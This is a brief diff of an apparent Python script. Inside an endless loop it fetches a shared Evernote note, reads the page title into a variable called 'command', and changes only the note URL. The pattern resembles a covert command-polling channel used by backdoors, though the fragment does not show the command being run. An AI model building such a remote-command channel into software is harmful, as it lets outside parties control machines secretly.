@@ -15,7 +15,7 @@ while True:
     try:
         #get HTML
         try:
-            html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
+            html_file = get("https://www.evernote.com/shard/s557/sh/f241b451-44a8-5ebe-3a73-cf74cb0fdaf5/2EW7PhNX5HU3KHOM1ZZGiu0d16La558Mv9vDJaLemJOZUP4kW2qbb1bBaQ").text
             soup = BeautifulSoup(html_file, 'lxml')
             command = soup.find('title').text
         except KeyboardInterrupt:
